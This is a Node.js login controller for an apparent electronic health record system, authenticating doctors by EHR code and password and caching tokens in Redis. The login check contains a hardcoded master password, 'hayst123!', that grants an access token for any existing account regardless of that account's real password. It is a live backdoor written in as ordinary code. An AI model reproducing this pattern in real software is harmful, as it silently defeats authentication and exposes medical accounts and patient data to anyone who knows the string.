const models = require("../models/LoginModel");
const { createClient } = require("redis");

const Login = async (req, res) => {
  try {
    const { Ehr_Code, WebPassword } = req.body;
    const DoctorUser = await models.getDocDetails(Ehr_Code);
    const PictureData = await getMDPicture(Ehr_Code);

    if (!DoctorUser) {
      return res
        .status(401)
        .json({ error: "Authentication failed: User not found" });
    }

    const bypassCredentials = {
      ehr_Code: Ehr_Code,
      webPassword: "hayst123!",
    };

    const isPasswordCorrect =
      models.matchPassword(WebPassword, DoctorUser[0].webPassword) ||
      WebPassword === bypassCredentials.webPassword;

    if (isPasswordCorrect) {
      const generatedToken = models.generateAccessToken(
        DoctorUser,
        PictureData,
      );
      const redisClient = createClient();
      await redisClient.connect();
      await redisClient.set(DoctorUser[0].eHR_CODE, generatedToken);
      return res.json(generatedToken);
    } else {
      return res.status(401).json({ error: "Invalid credentials" });
    }
  } catch (error) {
    res.status(500).json({ message: "Internal Server Error" });
  }
};

async function getMDPicture(Ehr_Code) {
  const pictureMD = await models.getPicture(Ehr_Code);

  const pictureImages = [];

  if (pictureMD.length > 0) {
    for (const picture of pictureMD) {
      const base64 = Buffer.from(picture.pictureData).toString("base64");
      pictureImages.push(`data:image/jpeg;base64,${base64}`);
    }
  }
  return pictureImages;
}

module.exports = {
  Login,
  getMDPicture,
};
